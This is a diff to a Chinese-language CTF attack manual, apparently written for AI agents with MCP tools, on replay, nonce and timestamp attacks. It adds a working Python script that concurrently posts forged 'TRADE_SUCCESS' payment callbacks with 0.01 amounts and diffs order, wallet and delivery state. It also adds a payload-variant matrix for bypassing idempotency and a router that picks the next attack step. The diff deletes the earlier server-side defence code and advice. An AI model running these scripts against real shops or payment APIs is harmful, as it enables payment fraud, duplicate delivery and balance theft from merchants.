@@ -4,21 +4,21 @@ title: "Replay / Nonce / Timestamp — 重放攻击深度技术手册"
 title_en: "Replay / Nonce / Timestamp — Replay Attack Deep Technical Manual"
 summary: >
   全面覆盖重放攻击技术：纯重放、跨用户/跨上下文重放、Nonce 预测（递增/时间戳/弱随机）、
-  Nonce 绕过（缺失/null/数组/耗尽）、时间戳操纵（epoch/负数/时区偏移）及并发窗口竞态。
+  Nonce 绕过（缺失/null/数组/耗尽）、时间戳操纵（epoch/负数/时区偏移）、支付回调幂等绕过及并发窗口竞态。
 summary_en: >
   Comprehensive replay attack coverage: plain replay, cross-user/cross-context replay, nonce prediction
   (sequential/timestamp/weak random), nonce bypass (missing/null/array/exhaustion), timestamp manipulation
   (epoch/negative/timezone offset), and concurrent window race conditions.
 board: "ctf-website"
 category: "13-signature"
-signals: ["replay attack", "重放攻击", "nonce绕过", "nonce预测", "timestamp操纵", "重放窗口", "nonce耗尽", "跨用户重放"]
+signals: ["replay attack", "重放攻击", "nonce绕过", "nonce预测", "timestamp操纵", "重放窗口", "nonce耗尽", "跨用户重放", "支付回调重放", "幂等绕过"]
 mcp_tools: ["http_probe", "kb_router"]
-keywords: ["重放攻击", "replay attack", "nonce绕过", "timestamp绕过", "nonce预测", "并发重放", "窗口攻击", "replay protection"]
+keywords: ["重放攻击", "replay attack", "nonce绕过", "timestamp绕过", "nonce预测", "并发重放", "窗口攻击", "支付回调重放", "幂等绕过"]
 difficulty: "advanced"
 tags: ["signature", "replay", "nonce", "race-condition", "time-based", "web-security", "ctf"]
 language: "zh-CN"
-last_updated: "2026-06-25"
-related_articles: ["ctf-website/13-signature/00-overview", "ctf-website/13-signature/01-algorithm"]
+last_updated: "2026-07-04"
+related_articles: ["ctf-website/13-signature/00-overview", "ctf-website/13-signature/01-algorithm", "ctf-website/12-payment/payment-callback-async"]
 ---
 # Replay / Nonce / Timestamp — 重放攻击深度技术手册
 
@@ -49,6 +49,63 @@ related_articles: ["ctf-website/13-signature/00-overview", "ctf-website/13-signa
     ├── N 秒窗口内重放
     ├── 并发窗口 (竞态)
     └── 窗口调整攻击
+```
+
+### 0.1 支付/订单重放路由
+
+支付回调和订单 API 的重放目标不是“第二次 200”，而是服务端副作用：多次发货、余额增加、退款后权益保留、跨订单入账。
+
+| 重放对象 | 关键字段 | 变体 | 命中标志 |
+|---|---|---|---|
+| 支付 notify | `out_trade_no`, `transaction_id`, `notify_id` | 同 tx、新 notify、空白/NUL/大小写 | 同订单多次权益 |
+| 订单发货 | `order_id`, `delivery_id`, `idempotency_key` | 并发、重试、失败后重发 | 多条 delivery/license |
+| 优惠券兑换 | `coupon_code`, `user_id`, `nonce` | 同码并发、跨商品、跨账号 | 折扣/余额重复增加 |
+| 退款/取消 | `refund_id`, `order_status`, `timestamp` | paid/cancel/refund 乱序 | 退款成功且权益仍在 |
+| API 签名 | `nonce`, `ts`, `sign` | 预测 nonce、未来/过去 ts | 签名请求跨时间窗口接受 |
+
+```python
+# replay_payment_oracle.py — 重放前后状态差分
+import concurrent.futures
+import json
+import requests
+
+BASE = "https://target"
+S = requests.Session()
+
+def snapshot(order_id):
+    paths = {
+        "order": f"/api/orders/{order_id}",
+        "payment": f"/api/payment/{order_id}",
+        "delivery": f"/api/orders/{order_id}/delivery",
+        "wallet": "/api/wallet",
+        "me": "/api/me",
+    }
+    out = {}
+    for name, path in paths.items():
+        r = S.get(BASE + path, timeout=8, allow_redirects=False)
+        out[name] = {"status": r.status_code, "len": len(r.text), "body": r.text[:500]}
+    return out
+
+def replay_notify(order_id, tx="TX_REPLAY_001", notify="N_REPLAY_001"):
+    body = {
+        "out_trade_no": order_id,
+        "transaction_id": tx,
+        "notify_id": notify,
+        "trade_status": "TRADE_SUCCESS",
+        "total_amount": "0.01",
+    }
+    return S.post(BASE + "/notify", json=body, timeout=10, allow_redirects=False)
+
+def concurrent_replay(order_id, n=20):
+    before = snapshot(order_id)
+    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
+        res = list(ex.map(lambda i: replay_notify(order_id, notify=f"N_REPLAY_{i}"), range(n)))
+    after = snapshot(order_id)
+    print(json.dumps({
+        "before": before,
+        "responses": [{"status": r.status_code, "len": len(r.text), "body": r.text[:120]} for r in res],
+        "after": after,
+    }, ensure_ascii=False, indent=2))
 ```
 
 ## 1. 纯重放攻击
@@ -1372,7 +1429,7 @@ if __name__ == "__main__":
         # 时间窗口
         api.time_window_exploit(endpoint, base_payload)
     
-    # 3. 耗尽测试（谨慎使用，可能造成损害）
+    # 3. 耗尽测试：只在 CTF/lab 目标上控制 flood_count，观察旧 nonce 是否重新可用
     # api.exhausted_nonce_test("/api/transfer", {"to": "test", "amount": 1})
     
     # 4. 输出报告
@@ -1397,62 +1454,43 @@ if __name__ == "__main__":
 | 大量 nonce 后旧的可用 | 超过 10000 个请求后 earliest 可重放 | 表耗尽 |
 | 签名绑定了 nonce 但 nonce 可预测 | sign = MD5(key + nonce + data) | 先预测 nonce 再算签名 |
 
-## 9. 对抗方案
+## 9. 重放成败分流与下一跳
+
+| 结果 | 解释 | 下一步 |
+|---|---|---|
+| 同一请求第二次仍有副作用 | nonce/幂等键未消费 | 扩大到并发重放，记录权益/余额/发货次数 |
+| 单次重放失败，并发成功 | check/use 非原子 | 用 gate/HTTP2 multiplexing 压窗口 |
+| 同 nonce 跨 endpoint 成功 | nonce 未绑定操作 | transfer → withdraw、pay → refund、create → deliver |
+| 同交易号新 notify 成功 | 幂等键选错字段 | 支付回调重放链 |
+| timestamp 未来/过去成功 | 时间窗口可控 | 叠加签名伪造、过期链接复用 |
+| nonce 可预测但 sign 不知道 | 需要签名密钥或实现缺陷 | 转 SQLi 抽 key、HLE、实现缺陷 |
 
 ```python
-# 服务端正确的 nonce + timestamp 对抗
-
-"""
-对抗 checklist:
-
-[必需]
-1. Nonce 唯一性: 每个 nonce 只能使用一次，存储已用 nonce
-2. Nonce 绑定用户: nonce 必须与 user_id/session_id 绑定
-3. Nonce 绑定操作: nonce 必须与具体 API 操作绑定，不可跨操作
-4. Timestamp 窗口: 接受时间戳 ±30 秒（通过 NTP 校准）
-5. HMAC 签名: sign = HMAC-SHA256(key, nonce + ts + data)
-
-[推荐]
-6. 限制 nonce 存储大小：Redis SETEX + 48h TTL
-7. IP + nonce 双重检查（但 IP 可能变化）
-8. 递增 nonce 检查：拒绝已用的 nonce 值和小于最小值的 nonce
-9. 签名包含 nonce + ts：防止篡改
-10. 幂等 key：对关键操作（支付、发货）使用 idempotency key
-
-[不要做]
-• 只用 timestamp 不用 nonce
-• nonce 值可预测（递增/时间戳/递增后 hash）
-• nonce 绑定到全局而不是用户
-• 签名不包含 nonce 和 ts
-• 永不过期的 nonce
-• 不限制 nonce 生成速率
-"""
-
-def secure_signature_verification(key: bytes, nonce: str, ts: int, data: dict, received_sign: str) -> bool:
-    """安全的 HMAC 签名验证"""
-    import hmac
-    
-    # 1. 检查 nonce 是否已用
-    if nonce_exists(nonce):
-        return False
-    
-    # 2. 检查时间戳偏差（±30 秒）
-    now = int(time.time())
-    if abs(ts - now) > 30:
-        return False
-    
-    # 3. 验证 HMAC 签名
-    message = f"{nonce}|{ts}|{json.dumps(data, sort_keys=True)}".encode()
-    expected_sign = hmac.new(key, message, hashlib.sha256).hexdigest()
-    
-    if not hmac.compare_digest(expected_sign, received_sign):
-        return False
-    
-    # 4. 标记 nonce 已用（原子操作，如 Redis SETNX）
-    mark_nonce_used(nonce, ttl=48 * 3600)
-    
-    return True
+# replay_result_router.py — 重放结果下一跳
+def route_replay_result(case):
+    if case.get("side_effect_count", 0) > 1:
+        return "concurrent_replay_or_idempotency_bypass"
+    if case.get("same_nonce_cross_endpoint"):
+        return "cross_operation_chain"
+    if case.get("predictable_nonce") and not case.get("can_sign"):
+        return "need_secret_or_signature_impl_bug"
+    if case.get("timestamp_accepted_offsets"):
+        return "time_window_chain"
+    if case.get("status") in (401, 403) and "invalid sign" in case.get("body", "").lower():
+        return "signature_layer_blocks_replay"
+    return "collect_order_wallet_entitlement_diff"
 ```
+
+### 9.1 Payment Callback Replay Matrix
+
+| 变体 | Payload 变化 | 观察 |
+|---|---|---|
+| same tx / same notify | 完全原样 | 是否重复发货 |
+| same tx / new notify | 只换 `notify_id` | 去重是否看 notify |
+| new tx / same order | 换 `transaction_id` | 同订单多流水 |
+| tx 大小写/空白 | `TX1`, `tx1`, `TX1 `, `TX1\x00` | 规范化是否一致 |
+| provider 切换 | `wechat`, `alipay`, `stripe`, `mock` | 唯一键是否含 provider |
+| paid/cancel/refund 乱序 | `paid → refunded → paid` | 最终状态和权益是否错位 |
 
 ## 10. 参考
 
@@ -1462,7 +1500,7 @@ def secure_signature_verification(key: bytes, nonce: str, ts: int, data: dict, r
 - AWS Signature V4: 每个请求唯一 signature (nonce + timestamp + scope)
 - OCSP Stapling: nonce 防重放
 
-> 记住：一个被接受的重复请求就是一个漏洞。不要假设客户端会「守规矩」只发一次。每次收到签名的请求，都要假定这是重放。
+> 记住：重放的确认点不是 HTTP 200，而是订单、余额、权益或 flag 的可重复变化。
 
 ## MCP 工具映射
 
@@ -1480,7 +1518,9 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 
 ## Evidence
 
-- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
-- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
-- 固定 session、输入、并发参数和时间窗口重放，记录成功响应、失败样本和下一跳。
-- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
+- `replay_matrix.jsonl`: endpoint、payload hash、nonce、timestamp、sign、round、status、body hash。
+- `payment_replay_diff.json`: 重放前后订单、支付流水、发货、余额、权益快照。
+- `nonce_pattern.csv`: nonce 样本、差分、时间偏移、预测结果、accepted/rejected。
+- `concurrent_window.json`: 并发数、worker、gate/HTTP2 设置、成功副作用次数。
+- 成功样本: 同请求或同交易变体导致多次发货、余额增加、退款后权益保留或 flag。
+- 失败样本: 只有一次成功副作用；重放全部 rejected；并发响应 200 但账本无变化。
